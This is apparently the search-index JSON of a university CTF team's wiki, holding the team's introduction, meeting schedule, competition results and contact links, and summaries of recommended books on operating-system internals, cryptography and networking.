{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"COMPASS CTF","text":"<p>COMPASS CTF is a CTF team belonging to the Southern University of Science and Technology (SUSTech). Our members are from the COMPASS lab.</p> <p>Visit our lab website: COMPASS</p> <p> </p> <p>Within a short period of two years since its establishment, COMPASS CTF has already won multiple national and provincial cybersecurity competition awards, including the first prize in the National College Student Information Security Competition, the special prize (champion) in the Guangdong College Student Cybersecurity Offense and Defense Competition, the \"Peak Geek\" Challenge \"Peak Talent Award\" (\u00a510,000), and the champion of the Spring and Autumn Cup.</p>"},{"location":"#activities","title":"Activities","text":"<ul> <li>Daily challenge: challenges are published every day. You can log into Intranet Challenge Platform and finish our daily challenges.</li> <li>Weekly meeting: every week we would have a meeting to synchronize our progress and plans for the next week. The meeting time is 4 pm, Thursday.</li> <li> <p>If you are interested, join our meeting channel: Tencent Meeting</p> </li> <li> <p>Weekly training: every week we would have trained together that let us learn and share information about CTF. The training time is 2 pm, Saturday.</p> </li> </ul>"},{"location":"#join-us","title":"Join us","text":"<p>If you want to participate CTFs or join us, please feel free to contact us if you satisfy the following requests:</p> <ul> <li>You are a student or an employee of SUSTech (we are a campus team!).</li> <li>You are interested in CTFs and you have the enthusiasm to learn new things about CTF.</li> <li>You know the basics of computer science or mathematics.</li> <li>You will enjoy your travel toward CTFs.</li> </ul> <p>If you are interested, please send to Email address: liz33#mail.sustech.edu.cn</p>"},{"location":"#contribute-to-the-wiki","title":"Contribute to the Wiki","text":"<p>It's highly recommended to pull requests about new content and anything you find useful for Wiki.</p> <p>Our docs are based on the GitHub pages and MkDocs engine, use markdown to format our website. Modify a new file and pull it to the repository. We highly appreciate your contribution!</p>"},{"location":"award/","title":"Competition Awards","text":"<p>The COMPASS CTF team has participated in various competitions since 2021. In most of the competitions, we have achieved great ranks, while some of them aren't.</p> <p>This file is an archive of all the competitions we joined. Both great ones and normal ones are collected here.</p>"},{"location":"award/#2023","title":"2023","text":"Competition Time Rank 2022\u5e7f\u4e1c\u7701\u8d5b\uff08\u51b3\u8d5b\uff09 Apr 15, 2023 \u603b\u6392\u540d#1\ud83e\udd47 \u7279\u7b49\u5956 2023\u5168\u56fd\u5927\u5b66\u751f\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b\uff08\u5168\u56fd\u603b\u51b3\u8d5b\uff09 Jul 26, 2023 \u603b\u6392\u540d#20 \u4e00\u7b49\u5956 2023\u5168\u56fd\u5927\u5b66\u751f\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b\uff08\u534e\u5357\u534a\u51b3\u8d5b\uff09 Jun 24, 2023 \u603b\u6392\u540d#8 \u4e00\u7b49\u5956 \u664b\u7ea7\u51b3\u8d5b 2022\u7f51\u9f0e\u676f\uff08\u534a\u51b3\u8d5b\uff09 Apr 14, 2023 \u9752\u9f99\u7ec4#21/\u603b\u6392\u540d#51"},{"location":"award/#2023_1","title":"2023\u56fd\u8d5b\u5168\u56fd\u603b\u51b3\u8d5b","text":""},{"location":"award/#2023_2","title":"2023\u56fd\u8d5b\u534e\u5357\u534a\u51b3\u8d5b","text":""},{"location":"award/#-","title":"\u7b2c\u4e8c\u5c4a\u5e7f\u4e1c\u5927\u5b66\u751f\u7f51\u7edc\u5b89\u5168\u653b\u9632\u5927\u8d5b-\u51b3\u8d5b","text":""},{"location":"award/#2022","title":"2022","text":"Competition Time Rank 2022 \u6625\u79cb\u676f\u51ac\u5b63\u8d5b Dec 23, 2022 #1\ud83e\udd47 \u51a0\u519b 2022 \u7f8e\u56e2\u6311\u6218\u8d5b Sep 18, 2022 #19 \u7f51\u9f0e\u676f 2022 \u9752\u9f99\uff08\u521d\u8d5b\uff09 Aug 26, 2022 #7 \u5165\u56f4\u534a\u51b3\u8d5b \u5dc5\u5cf0\u6781\u5ba2 2022\uff08\u51b3\u8d5b\uff09 Aug 24, 2022 #10 \u5dc5\u5cf0\u4eba\u624d\u5956 \u5dc5\u5cf0\u6781\u5ba2 2022\uff08\u521d\u8d5b\uff09 Aug 17, 2022 #12 \u5165\u56f4\u51b3\u8d5b \u5f3a\u7f51\u676f 2022 Jul 30, 2022 #55 \u5f3a\u7f51\u5148\u950b\u5956 DiceCTF 2022 Jul 24, 2022 #21 \u5e7f\u4e1c\u7701\u8d5b 2022\uff08\u521d\u8d5b\uff09 Mar 21, 2022 #9 \u5165\u56f4\u51b3\u8d5b \u864e\u7b26CTF 2022 Mar 19, 2022 #36 ECTF 2022 Mar 05, 2022 #31 CODEGATE 2022 Feb 26, 2022 #29 TQLCTF 2022 Feb 19, 2022 #37 VU CYBERTHON 2022 Feb 18, 2022 #78 DefCamp 2022 Feb 11, 2022 #194 Real World CTF Jan 21, 2022 #159 KnightCTF 2022 Jan 20, 2022 #140"},{"location":"award/#2022_1","title":"\u6625\u79cb\u676f 2022 \u51ac\u5b63\u8d5b","text":""},{"location":"award/#2022_2","title":"\u7f51\u9f0e\u676f 2022","text":""},{"location":"award/#2022_3","title":"\u5dc5\u5cf0\u6781\u5ba2 2022","text":""},{"location":"award/#2022_4","title":"\u5f3a\u7f51\u676f 2022","text":""},{"location":"award/#dicectf-2022","title":"DiceCTF 2022","text":""},{"location":"award/#2022_5","title":"\u5e7f\u4e1c\u7701\u8d5b\u521d\u8d5b 2022","text":""},{"location":"award/#ctf-2022","title":"\u864e\u7b26CTF 2022","text":""},{"location":"award/#knightctf-2022","title":"KnightCTF 2022","text":""},{"location":"award/#vu-cyberthon-2022","title":"VU CYBERTHON 2022","text":""},{"location":"award/#tqlctf-2022","title":"TQLCTF 2022","text":""},{"location":"award/#codegate-2022","title":"CODEGATE 2022","text":""},{"location":"award/#ectf-2022","title":"ECTF 2022","text":""},{"location":"member/","title":"Members","text":"<p>From the spring of 2021, we start to form the COMPASS CTF team. Our passion team us together and we grow to be experienced CTF and computer security engineers.</p> <p>Let's walk together and achieve further.</p> <p></p> <p></p> <p></p> <p></p> <p>We also have some members already finished their career in the CTF. We had a great time together, and hope you have better future! </p> <p>Previous members of COMPASS CTF:</p> <p></p> <p></p> <p></p>"},{"location":"related/","title":"Related Links","text":"<p>COMPASS Lab Website: http://compass.sustech.edu.cn/</p> <p>COMPASS CTF Challenge Page: http://detroit.sustech.edu.cn/</p> <ul> <li>We are going to use GZCTF later, the new website is: http://detroit.sustech.edu.cn:29998/</li> </ul> <p>SUSTech CSE Website: https://cse.sustech.edu.cn/</p>"},{"location":"related/#our-discussion-and-chat-channels","title":"Our Discussion and Chat Channels","text":"<p>COMPASS CTF QQ Group: 787427165</p> <p>COMPASS CTF WeChat Group: Please contact me to get the invitation link.</p> <p>COMPASS CTF Discord Channel: https://discord.gg/E9UtxCD6</p>"},{"location":"related/#weekly-meeting-link","title":"Weekly Meeting Link","text":"<p>Feel free to join our weekly meeting if you are interested in the CTF or our training schedule.</p> <p>During the meeting, we would use Mandarin to discuss, but all the members of our team can talk English as well :)</p> <pre><code>Ander invites you to join Ander's personal meeting room\nClick on the link to join the meeting directly at\nhttps://meeting.tencent.com/p/4484894504\n\n#tencentconference: 448-489-4504\n\nCopy this message and open the mobile Tencent meeting to participate\n</code></pre>"},{"location":"related/#blog-and-friend-links","title":"Blog and Friend-Links","text":""},{"location":"Book/CTF%20Competition%20Starter%20Guide/","title":"CTF Competition Starter Guide","text":"<p>Highly recommended! A beginner's guide!</p> <p>This book is mainly for CTF beginners, focusing on Linux binary security. The book contains 12 chapters, starting from the bottom of the binary, combined with the source code detailed analysis of common binary security vulnerabilities, mitigation mechanisms and vulnerability exploitation methods, and supplemented with analysis tools and environment building explanation, step by step, so that readers can learn systematically. The book is more continuous and complete in the selection of content and materials, each knowledge point with classic examples, and spend a lot of space to explain, in order to restore the maximum extent of the analysis of ideas and solution process, to achieve the effect of the three.</p> <p></p>"},{"location":"Book/CTF%20Competition%20Starter%20Guide/#link","title":"Link","text":"<p>Read it online: https://firmianay.gitbooks.io/ctf-all-in-one/content/</p> <p>GitHub address: https://github.com/firmianay/CTF-All-In-One</p>"},{"location":"Book/From%200%20to%201%20The%20CTFer%20Growth%20Path/","title":"From 0 to 1: The CTFer Growth Path","text":"<p>Recommend and be done with it, Nu1L yyds!</p> <p>Jingdong buy: https://item.jd.com/12988770.html</p>"},{"location":"Book/Computer%20and%20System/Android%20Dalvik%20virtual%20machine%20structure%20and%20mechanism%20anatomy/","title":"Android Dalvik virtual machine structure and mechanism analysis","text":"<p>Author: Wu Yanxia / Zhang Guoyin</p>"},{"location":"Book/Computer%20and%20System/Android%20Dalvik%20virtual%20machine%20structure%20and%20mechanism%20anatomy/#overview","title":"Overview","text":"<p>This book is a scenario-based in-depth analysis of Android source code, with extensive contents, mainly from the overall structure of Dalvik virtual machine, obtaining and compiling the source code of Dalvik virtual machine, using source code analysis aids, parsing .dex files and Dalvik bytecode format, introducing the system tools under Dalvik virtual machine and executing Dalvik virtual machine. This article is intended to help readers understand the architecture of the Dalvik VM from a macro perspective, and to provide readers interested in reading the source code of the Dalvik VM with the necessary introductory guidance.</p>"},{"location":"Book/Computer%20and%20System/Android%20Dalvik%20virtual%20machine%20structure%20and%20mechanism%20anatomy/#cover","title":"Cover","text":""},{"location":"Book/Computer%20and%20System/Android%20Internals/","title":"Android Internals: Power User's View","text":"<p>Author: Jonathan Levin  (Author)</p>"},{"location":"Book/Computer%20and%20System/Android%20Internals/#overview","title":"Overview","text":"<p>Android Internals::A Confectioner's Cookbook is the first time the inner workings of the world's most popular operating system have been documented! Without going into the lengthy code, it presents the logic and flow of Android's various components using detailed illustrations, verbose annotations and hands-on experiments! Volume I takes the power user's point of view - the utilities and functionality accessible through adb shell. In particular, we explore: Partitions and Filesystems The Boot Process Init and its configuration files The native daemons in /system/bin The framework service architecture and servicemanager, Monitoring through Linux interfaces, and of course Security. All versions of Android - up to and including the upcoming Nougat - are covered, with examples taken from the wide gamut of Android Devices - Nexi, Samsung Galaxy S series, NVidia Shield, Amazon Kindle, HTC One M9, and the Android Emulator. This is the first in a multi-volume series, aiming to explore Android down to its last class. Stay tuned for Volume II - The Programmer's View - which picks up where the Power User's View ends, and dives deeper still into the frameworks, input, audio, video and network architecture... wading through the inevitable quagmire of code.</p>"},{"location":"Book/Computer%20and%20System/Android%20Internals/#cover","title":"Cover","text":""},{"location":"Book/Computer%20and%20System/Android%20system%20source%20code%20scenario%20analysis/","title":"Android System Source Code Scenario Analysis","text":"<p>Author: Luo Shengyang</p>"},{"location":"Book/Computer%20and%20System/Android%20system%20source%20code%20scenario%20analysis/#overview","title":"Overview","text":"<p>In terms of content, this book provides a comprehensive, in-depth and detailed analysis of the Android system source code, including the Linux kernel layer, hardware abstraction layer (HAL), runtime library layer (Runtime), application framework layer (Application Framework) and application layer (Application).</p> <p>In terms of organization, this book divides the above contents into three major chapters, namely, the first acquaintance with Android system, Android-specific driver system and Android application framework. The chapter of Android system introduces reference books, basic knowledge and experimental environment construction; the chapter of Android special driver system introduces Logger log driver, Binder inter-process communication driver and Ashmem anonymous shared memory driver; the chapter of Android application framework introduces the framework of Android application in four dimensions: component, process, message and installation. The Android application framework chapter provides an in-depth analysis of the framework of Android applications in four dimensions: components, processes, messages and installation.</p> <p>Through the above contents and their organization, this book enables readers to grasp the hierarchy of Android system as a whole and master the key points of each level in detail.</p>"},{"location":"Book/Computer%20and%20System/Android%20system%20source%20code%20scenario%20analysis/#cover","title":"Cover","text":""},{"location":"Book/Computer%20and%20System/Code%20Reveal/","title":"Code Reveal","text":"<p>Author: Zuo Fei</p>"},{"location":"Book/Computer%20and%20System/Code%20Reveal/#overview","title":"Overview","text":"<p>This book is written from the programming point of view, using C/C++ as the descriptive language and Visual C++ as the formal tool, to explain the mechanisms and knowledge about computer composition principles and computer operating systems hidden behind the code, not only to let the reader know the facts, but also to let the reader know the reasons. This knowledge is then applied to programming practice to help readers write high-quality code that is more suitable for machine optimization. Uncovering the little-known secrets behind the code, specifically, the book discusses a variety of topics including the underlying computer coding, memory and pointers, computer instructions and code systems, the mechanism of function calls, multi-level storage systems, the concept of threads and processes, and code optimization.</p>"},{"location":"Book/Computer%20and%20System/Code%20Reveal/#cover","title":"Cover","text":""},{"location":"Book/Computer%20and%20System/Code/","title":"Code: The Hidden Language of Computer Hardware and Software","text":"<p>Author: Charles Petzold</p>"},{"location":"Book/Computer%20and%20System/Code/#content","title":"Content","text":"<p>Petzold begins Code by discussing older technologies like Morse code, Braille, and Boolean logic, which he uses to explain vacuum tubes, transistors, and integrated circuits. He noted that \"very smart people\" had to go down the \"dead ends\" of mechanical computers and decimal computing before reaching a scalable solution\u2014namely, the electronic, binary computer with a von Neumann architecture. The book also covers more recent developments, including topics like floating point math, operating systems, and ASCII.</p> <p>The book focuses on \"pre-networked computers\" and does not cover concepts like distributed computing because Petzold thought that it would not be as useful for \"most people using the Internet\", his intended audience. Specifically, he said in an interview that his \"main hope\" in writing Code was to impart upon his readers a \"really good feeling for what a bit is, and how bits are combined to convey information\".</p>"},{"location":"Book/Computer%20and%20System/Code/#cover","title":"Cover","text":""},{"location":"Book/Computer%20and%20System/Computer%20Systems/","title":"Computer Systems: A Programmer's Perspective","text":"<p>Author: Randal Bryant (Author), David O'Hallaron (Author)</p>"},{"location":"Book/Computer%20and%20System/Computer%20Systems/#overview","title":"Overview","text":"<p>This book (CS:APP3e) is the third edition of a book that stems from the introductory computer systems course we developed at Carnegie Mellon University, starting in the Fall of 1998, called \"Introduction to Computer Systems\" (ICS). The presentation is based on the following principles, which aim to help the students become better programmers and to help prepare them for upper-level systems courses:</p> <ul> <li> <p>Students should be introduced to computer systems from the perspective of a programmer, rather from the more traditional perspective of a system implementer. What does this mean?</p> </li> <li> <p>Students should get a view of the complete system, comprising the hardware, operating system, compiler, and network.</p> </li> <li> <p>Students learn best by developing and evaluating real programs that run on real machines.</p> </li> </ul> <p>We cover data representations, machine level representations of C programs, processor architecture, program optimizations, the memory hierarchy, linking, exceptional control flow (exceptions, interrupts, processes, and Unix signals), virtual memory and memory management, system-level I/O, basic network programming, and concurrent programming. These concepts are supported by series of fun and hands-on lab assignments. See the manuscript Preface for more details.</p>"},{"location":"Book/Computer%20and%20System/Computer%20Systems/#cover","title":"Cover","text":""},{"location":"Book/Computer%20and%20System/In-depth%20understanding%20of%20Android%20kernel%20design%20ideas/","title":"In-depth understanding of Android kernel design ideas","text":"<p>Author: Lin Xuesen</p>"},{"location":"Book/Computer%20and%20System/In-depth%20understanding%20of%20Android%20kernel%20design%20ideas/#overview","title":"Overview","text":"<p>In-depth Understanding of Android Kernel Design Ideas\" is suitable for Android 4.3 or above. The book starts from the basics of operating system, and comprehensively analyzes the implementation principle of core technologies in Android, such as process/thread, memory management, Binder mechanism, GUI display system, multimedia management, input system and so on. Most of the knowledge points in the book come from engineering project development, so it has strong practicality, and we hope to let readers \"know what they know, but also know what they know\". The book is divided into 4 chapters and 22 chapters, including compilation, system principle, application principle and system tools, which basically cover the knowledge required to participate in Android development, and guide readers through a large number of pictures and examples, in order to provide readers with a more understandable way of thinking outside the source code analysis as much as possible.</p> <p>In-depth Understanding of Android Kernel Design Ideas is suitable for both Android system engineers and application development engineers to read and improve Android development ability. Readers can gain a deeper understanding of the Android system during the subtle learning process of \"In-depth Understanding of Android Kernel Design Ideas\", and apply the knowledge learned naturally to solve practical development problems.</p>"},{"location":"Book/Computer%20and%20System/In-depth%20understanding%20of%20Android%20kernel%20design%20ideas/#cover","title":"Cover","text":""},{"location":"Book/Computer%20and%20System/Linux%20Kernel%20Development/","title":"Linux Kernel Development","text":"<p>Author: Robert Love  (Author)</p>"},{"location":"Book/Computer%20and%20System/Linux%20Kernel%20Development/#book-description","title":"Book description","text":"<p>Linux Kernel Development details the design and implementation of the Linux kernel, presenting the content in a manner that is beneficial to those writing and developing kernel code, as well as to programmers seeking to better understand the operating system and become more efficient and productive in their coding.</p> <p>The book details the major subsystems and features of the Linux kernel, including its design, implementation, and interfaces. It covers the Linux kernel with both a practical and theoretical eye, which should appeal to readers with a variety of interests and needs.</p> <p>The author, a core kernel developer, shares valuable knowledge and experience on the 2.6 Linux kernel. Specific topics covered include process management, scheduling, time management and timers, the system call interface, memory addressing, memory management, the page cache, the VFS, kernel synchronization, portability concerns, and debugging techniques. This book covers the most interesting features of the Linux 2.6 kernel, including the CFS scheduler, preemptive kernel, block I/O layer, and I/O schedulers.</p> <p>The third edition of Linux Kernel Development includes new and updated material throughout the book:</p> <ul> <li>An all-new chapter on kernel data structures</li> <li>Details on interrupt handlers and bottom halves</li> <li>Extended coverage of virtual memory and memory allocation</li> <li>Tips on debugging the Linux kernel</li> <li>In-depth coverage of kernel synchronization and locking</li> <li>Useful insight into submitting kernel patches and working with the Linux kernel community</li> </ul>"},{"location":"Book/Computer%20and%20System/Linux%20Kernel%20Development/#cover","title":"Cover","text":""},{"location":"Book/Computer%20and%20System/Mac%20OS%20X%20and%20iOS%20Internals/","title":"Mac OS X and iOS Internals: To the Apple\u2019s Core","text":"<p>Author: Jonathan Levin  (Author)</p>"},{"location":"Book/Computer%20and%20System/Mac%20OS%20X%20and%20iOS%20Internals/#overview","title":"Overview","text":"<p>Powering Macs, iPhones, iPads and more, OS X and iOS are becoming ubiquitous. When it comes to documentation, however, much of them are shrouded in mystery. Cocoa and Carbon, the application frameworks, are neatly described, but system programmers find the rest lacking. This indispensable guide illuminates the darkest corners of those systems, starting with an architectural overview, then drilling all the way to the core.</p> <ul> <li>Provides you with a top down view of OS X and iOS</li> <li>Walks you through the phases of system startup\u2014both Mac (EFi) and mobile (iBoot)</li> <li>Explains how processes, threads, virtual memory, and filesystems are maintained</li> <li>Covers the security architecture</li> <li>Reviews the internal Apis used by the system\u2014BSD and Mach</li> <li>Dissects the kernel, XNU, into its sub components: Mach, the BSD Layer, and I/o kit, and explains each in detail</li> <li>Explains the inner workings of device drivers</li> </ul> <p>From architecture to implementation, this book is essential reading if you want to get serious about the internal workings of Mac OS X and iOS.</p>"},{"location":"Book/Computer%20and%20System/Mac%20OS%20X%20and%20iOS%20Internals/#cover","title":"Cover","text":""},{"location":"Book/Computer%20and%20System/Understanding%20the%20Linux%20Kernel/","title":"Understanding the Linux Kernel","text":"<p>Author: Daniel P. Bovet  (Author), Marco Cesati  (Author)</p>"},{"location":"Book/Computer%20and%20System/Understanding%20the%20Linux%20Kernel/#overview","title":"Overview","text":"<p>In order to thoroughly understand what makes Linux tick and why it works so well on a wide variety of systems, you need to delve deep into the heart of the kernel. The kernel handles all interactions between the CPU and the external world, and determines which programs will share processor time, in what order. It manages limited memory so well that hundreds of processes can share the system efficiently, and expertly organizes data transfers so that the CPU isn't kept waiting any longer than necessary for the relatively slow disks.</p> <p>The third edition of Understanding the Linux Kernel takes you on a guided tour of the most significant data structures, algorithms, and programming tricks used in the kernel. Probing beyond superficial features, the authors offer valuable insights to people who want to know how things really work inside their machine. Important Intel-specific features are discussed. Relevant segments of code are dissected line by line. But the book covers more than just the functioning of the code; it explains the theoretical underpinnings of why Linux does things the way it does.</p> <p>This edition of the book covers Version 2.6, which has seen significant changes to nearly every kernel subsystem, particularly in the areas of memory management and block devices. The book focuses on the following topics:</p> <ul> <li>Memory management, including file buffering, process swapping, and Direct memory Access (DMA)</li> <li>The Virtual Filesystem layer and the Second and Third Extended Filesystems</li> <li>Process creation and scheduling</li> <li>Signals, interrupts, and the essential interfaces to device drivers</li> <li>Timing</li> <li>Synchronization within the kernel</li> <li>Interprocess Communication (IPC)</li> <li>Program execution</li> </ul> <p>Understanding the Linux Kernel will acquaint you with all the inner workings of Linux, but it's more than just an academic exercise. You'll learn what conditions bring out Linux's best performance, and you'll see how it meets the challenge of providing good system response during process scheduling, file access, and memory management in a wide variety of environments. This book will help you make the most of your Linux system.</p>"},{"location":"Book/Computer%20and%20System/Understanding%20the%20Linux%20Kernel/#cover","title":"Cover","text":""},{"location":"Book/Computer%20and%20System/Windows%20Internals/","title":"Windows Internals","text":"<p>Author: Pavel Yosifovich  (Author), Mark Russinovich (Author), David Solomon (Author), Alex Ionescu  (Author)</p>"},{"location":"Book/Computer%20and%20System/Windows%20Internals/#overview","title":"Overview","text":"<p>This book helps you:</p> <ul> <li>Understand the Windows system architecture and its general components</li> <li>Explore internal data structures using tools like the kernel debugger</li> <li>Understand how Windows uses processes for management and isolation</li> <li>Understand and view thread scheduling and how CPU resources are managed</li> <li>Dig into the Windows security model including recent advances in security mitigations</li> <li>Understand how Windows manages virtual and physical memory</li> <li>Understand how the I/O system manages physical devices and device drivers</li> </ul> <p>The 7th edition was written by Pavel Yosifovich, Alex Ionescu, Mark Russinovich and David Solomon. New material has been added since the 6th edition (which covered Windows 7 and Windows Server 2008 R2). Since the 7th edition\u2019s part 2 is not yet available, the Windows Internals 6th edition (written by Mark Russinovich, David Solomon and Alex Ionescu) is an invaluable resource on missing topics from the first part of the 7th edition. These include system mechanisms, management mechanisms, networking, file systems, cache management and troubleshooting system crashes.</p>"},{"location":"Book/Computer%20and%20System/Windows%20Internals/#history-of-the-book","title":"History of the Book","text":"<p>This is the seventh edition of a book that was originally called Inside Windows NT (Microsoft Press, 1992), written by Helen Custer (prior to the initial release of Microsoft Windows NT 3.1). Inside Windows NT was the first book ever published about Windows NT and provided key insights into the architecture and design of the system. Inside Windows NT, Second Edition (Microsoft Press, 1998) was written by David Solomon. It updated the original book to cover Windows NT 4.0 and had a greatly increased level of technical depth. Inside Windows 2000, Third Edition (Microsoft Press, 2000) was authored by David Solomon and Mark Russinovich. It added many new topics, such as startup and shutdown, service internals, registry internals, file-system drivers, and networking. It also covered kernel changes in Windows 2000, such as the Windows Driver Model (WDM), Plug and Play, power management, Windows Management Instrumentation (WMI), encryption, the job object, and Terminal Services. Windows Internals, Fourth Edition was the Windows XP and Windows Server 2003 update and added more content focused on helping IT professionals make use of their knowledge of Windows internals, such as using key tools from Windows Sysinternals and analyzing crash dumps.</p> <p>Windows Internals, Fifth Edition was the update for Windows Vista and Windows Server 2008. It saw Mark Russinovich move on to a full-time job at Microsoft (where he is now the Azure CTO) and the addition of a new co-author, Alex Ionescu. New content included the image loader, user-mode debugging facility, Advanced Local Procedure Call (ALPC), and Hyper-V. The next release, Windows Internals, Sixth Edition, was fully updated to address the many kernel changes in Windows 7 and Windows Server 2008 R2, with many new hands-on experiments to reflect changes in the tools as well.</p>"},{"location":"Book/Computer%20and%20System/Windows%20Internals/#seventh-edition-changes","title":"Seventh Edition Changes","text":"<p>Since this series\u2019 last update, Windows has gone through several releases, coming up to Windows 10 and Windows Server 2016. Windows 10 itself, being the current going-forward name for Windows, has had several releases since its initial Release-to-Manufacturing, or RTM, each labeled with a 4-digit version number indicating year and month of release, such as Windows 10, version 1703 that was completed in March 2017. The above implies that Windows has gone through at least 6 versions since Windows 7. Starting with Windows 8, Microsoft began a process of OS convergence, which is beneficial from a development perspective as well as for the Windows engineering team itself. Windows 8 and Windows Phone 8 had converged kernels, with modern app convergence arriving in Windows 8.1 and Windows Phone 8.1. The convergence story was complete with Windows 10, which runs on desktops/laptops, servers, XBOX One, phones (Windows Mobile 10), HoloLens, and various Internet of Things (IoT) devices. With this grand unification completed, the time was right for a new edition of the series, which could now finally catch up with almost half a decade of changes, in what will now be a more stabilized kernel architecture going forward. As such, this latest book covers aspects of Windows from Windows 8 to Windows 10, version 1703. Additionally, this edition welcomes Pavel Yosifovich as its new co-author.</p>"},{"location":"Book/Computer%20and%20System/Windows%20Internals/#cover","title":"Cover","text":""},{"location":"Book/Cryptography/Foundations%20of%20Cryptography/","title":"Foundations of Cryptography","text":"<p>Author: Oded Goldreich  (Author)</p>"},{"location":"Book/Cryptography/Foundations%20of%20Cryptography/#introduction","title":"Introduction","text":"<p>Cryptography is concerned with the conceptualization, definition and construction of computing systems that address security concerns. This book presents a rigorous and systematic treatment of the foundational issues: defining cryptographic tasks and solving new cryptographic problems using existing tools. It focuses on the basic mathematical tools: computational difficulty (one-way functions), pseudo randomness and zero-knowledge proofs. Rather than describing ad-hoc approaches, this book emphasizes the clarification of fundamental concepts and the demonstration of the feasibility of solving cryptographic problems. It is suitable for use in a graduate course on cryptography and as a reference book for experts.</p>"},{"location":"Book/Cryptography/Foundations%20of%20Cryptography/#cover","title":"Cover","text":""},{"location":"Book/Cryptography/Graphical%20cryptography/","title":"Graphical cryptography","text":"<p>Author: [Japanese] Hiroshi Yuki</p>"},{"location":"Book/Cryptography/Graphical%20cryptography/#introduction","title":"Introduction","text":"<p>This book explains in detail the six most important cryptographic techniques: symmetric ciphers, public key ciphers, one-way hash functions, message authentication codes, digital signatures, and pseudo-random number generators, in the form of diagrams with text.</p> <p>Part 1 describes the history of cryptography, symmetric ciphers, grouped cipher patterns (including ECB, CBC, CFB, OFB, CTR), public keys, and hybrid cryptosystems. Part 2 focuses on authentication aspects, covering one-way hash functions, message authentication codes, digital signatures, certificates, etc. Part 3 talks about keys, random numbers, PGP, SSL/TLS, and real-life applications of cryptography.</p>"},{"location":"Book/Cryptography/Graphical%20cryptography/#cover","title":"Cover","text":""},{"location":"Book/Cryptography/Introduction%20to%20Modern%20Cryptography/","title":"Introduction to Modern Cryptography: Principles and Protocols","text":"<p>Author: Jonathan Katz  (Author), Yehuda Lindell  (Author)</p>"},{"location":"Book/Cryptography/Introduction%20to%20Modern%20Cryptography/#introduction","title":"Introduction","text":"<p>Cryptography plays a key role in ensuring the privacy and integrity of data and the security of computer networks. Introduction to Modern Cryptography provides a rigorous yet accessible treatment of modern cryptography, with a focus on formal definitions, precise assumptions, and rigorous proofs.</p> <p>The authors introduce the core principles of modern cryptography, including the modern, computational approach to security that overcomes the limitations of perfect secrecy. An extensive treatment of private-key encryption and message authentication follows. The authors also illustrate design principles for block ciphers, such as the Data Encryption Standard (DES) and the Advanced Encryption Standard (AES), and present provably secure constructions of block ciphers from lower-level primitives. The second half of the book focuses on public-key cryptography, beginning with a self-contained introduction to the number theory needed to understand the RSA, Diffie-Hellman, El Gamal, and other cryptosystems. After exploring public-key encryption and digital signatures, the book concludes with a discussion of the random oracle model and its applications.</p> <p>Serving as a textbook, a reference, or for self-study, Introduction to Modern Cryptography presents the necessary tools to fully understand this fascinating subject.</p>"},{"location":"Book/Cryptography/Introduction%20to%20Modern%20Cryptography/#cover","title":"Cover","text":""},{"location":"Book/Cryptography/Understanding%20Cryptography/","title":"Understanding Cryptography: A Textbook for Students and Practitioners","text":"<p>Author: Christof Paar  (Author), Jan Pelzl  (Author), Bart Preneel (Foreword)</p>"},{"location":"Book/Cryptography/Understanding%20Cryptography/#introduction","title":"Introduction","text":"<p>Cryptography is now ubiquitous \u2013 moving beyond the traditional environments, such as government communications and banking systems, we see cryptographic techniques realized in Web browsers, e-mail programs, cell phones, manufacturing systems, embedded software, smart buildings, cars, and even medical implants. Today's designers need a comprehensive understanding of applied cryptography.</p> <p>After an introduction to cryptography and data security, the authors explain the main techniques in modern cryptography, with chapters addressing stream ciphers, the Data Encryption Standard (DES) and 3DES, the Advanced Encryption Standard (AES), block ciphers, the RSA cryptosystem, public-key cryptosystems based on the discrete logarithm problem, elliptic-curve cryptography (ECC), digital signatures, hash functions, Message Authentication Codes (MACs), and methods for key establishment, including certificates and public-key infrastructure (PKI). Throughout the book, the authors focus on communicating the essentials and keeping the mathematics to a minimum, and they move quickly from explaining the foundations to describing practical implementations, including recent topics such as lightweight ciphers for RFIDs and mobile devices, and current key-length recommendations.</p> <p>The authors have considerable experience teaching applied cryptography to engineering and computer science students and to professionals, and they make extensive use of examples, problems, and chapter reviews, while the book\u2019s website offers slides, projects and links to further resources. This is a suitable textbook for graduate and advanced undergraduate courses and also for self-study by engineers.</p>"},{"location":"Book/Cryptography/Understanding%20Cryptography/#cover","title":"Cover","text":""},{"location":"Book/Network/Computer%20Networking/","title":"Computer Networking: A Top-Down Approach","text":"<p>Author: James Kurose (Author), Keith Ross (Author)</p>"},{"location":"Book/Network/Computer%20Networking/#overview","title":"Overview","text":"<p>Motivates readers with a top-down, layered approach to computer networking</p> <p>Unique among computer networking texts, the Seventh Edition of the popular Computer Networking: A Top Down Approach** builds on the author\u2019s long tradition of teaching this complex subject through a layered approach in a \u201ctop-down manner.\u201d The text works its way from the application layer down toward the physical layer, motivating readers by exposing them to important concepts early in their study of networking. Focusing on the Internet and the fundamentally important issues of networking, this text provides an excellent foundation for readers interested in computer science and electrical engineering, without requiring extensive knowledge of programming or mathematics. The Seventh Edition** has been updated to reflect the most important and exciting recent advances in networking.</p>"},{"location":"Book/Network/Computer%20Networking/#cover","title":"Cover","text":""},{"location":"Book/Network/Practical%20Packet%20Analysis/","title":"Practical Packet Analysis: Using Wireshark to Solve Real-World Network Problems","text":"<p>Author: Chris Sanders  (Author)</p>"},{"location":"Book/Network/Practical%20Packet%20Analysis/#overview","title":"Overview","text":"<p>It's easy to capture packets with Wireshark, the world's most popular network sniffer, whether off the wire or from the air. But how do you use those packets to understand what's happening on your network?</p> <p>With an expanded discussion of network protocols and 45 completely new scenarios, this extensively revised second edition of the best-selling Practical Packet Analysis will teach you how to make sense of your PCAP data. You'll find new sections on troubleshooting slow networks and packet analysis for security to help you better understand how modern exploits and malware behave at the packet level. Add to this a thorough introduction to the TCP/IP network stack and you're on your way to packet analysis proficiency.</p> <p>Learn how to:</p> <ul> <li>Use packet analysis to identify and resolve common network problems like loss of connectivity, DNS issues, sluggish speeds, and malware infections</li> <li>Build customized capture and display filters</li> <li>Monitor your network in real-time and tap live network communications</li> <li>Graph traffic patterns to visualize the data flowing across your network</li> <li>Use advanced Wireshark features to understand confusing captures</li> <li>Build statistics and reports to help you better explain technical network information to non-techies</li> </ul> <p>Practical Packet Analysis is a must for any network technician, administrator, or engineer. Stop guessing and start troubleshooting the problems on your 